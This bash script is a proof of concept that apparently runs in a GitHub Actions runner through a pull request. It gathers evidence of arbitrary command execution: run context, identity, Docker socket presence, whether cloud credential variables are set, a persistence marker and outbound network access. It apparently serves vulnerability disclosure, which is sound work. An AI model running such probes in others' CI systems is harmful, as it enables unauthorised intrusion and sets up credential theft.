#!/usr/bin/env bash
set -euo pipefail

echo "=== poc1:runner-exec:start ==="

# Immutable run context evidence.
echo "evidence_repo=${GITHUB_REPOSITORY:-unknown}"
echo "evidence_event=${GITHUB_EVENT_NAME:-unknown}"
echo "evidence_ref=${GITHUB_REF:-unknown}"
echo "evidence_sha=${GITHUB_SHA:-unknown}"
echo "evidence_run_id=${GITHUB_RUN_ID:-unknown}"
echo "evidence_run_attempt=${GITHUB_RUN_ATTEMPT:-unknown}"
echo "evidence_triggering_actor=${GITHUB_TRIGGERING_ACTOR:-unknown}"

echo "evidence_runner_name=${RUNNER_NAME:-unknown}"
echo "evidence_runner_os=${RUNNER_OS:-unknown}"
echo "evidence_runner_arch=${RUNNER_ARCH:-unknown}"
echo "evidence_hostname=$(hostname)"
echo "evidence_uid_gid=$(id -u):$(id -g)"

# Proves arbitrary shell command execution in runner context.
if uname -a >/dev/null 2>&1; then
  echo "evidence_cmd_exec=ok"
else
  echo "evidence_cmd_exec=failed"
fi

# Environment capability probes.
[[ -S /var/run/docker.sock ]] && echo "evidence_docker_sock=present" || echo "evidence_docker_sock=absent"
[[ -d /home/runner/work ]] && echo "evidence_workspace_dir=present" || echo "evidence_workspace_dir=absent"

for v in GOOGLE_APPLICATION_CREDENTIALS AWS_ACCESS_KEY_ID AZURE_TENANT_ID; do
  [[ -n "${!v:-}" ]] && echo "evidence_env_${v}=set" || echo "evidence_env_${v}=unset"
done

# Persistence probe: unique marker per run-id so concurrent runs do not collide.
marker_suffix="${GITHUB_RUN_ID:-$$}_${GITHUB_RUN_ATTEMPT:-1}"
MARKER="/tmp/distroless_pr_poc_marker_${marker_suffix}"
if [[ -f "$MARKER" ]]; then
  echo "evidence_persistence_marker=present"
  head -n1 "$MARKER" || true
else
  echo "evidence_persistence_marker=absent_creating"
  date -Is > "$MARKER"
fi

# Explicit egress result, without silent failure ambiguity.
if code="$(curl -m 3 -s -o /dev/null -w '%{http_code}' https://example.com)"; then
  echo "evidence_egress_https_status=${code}"
else
  echo "evidence_egress_https_status=curl_error"
fi

echo "=== poc1:runner-exec:end ==="
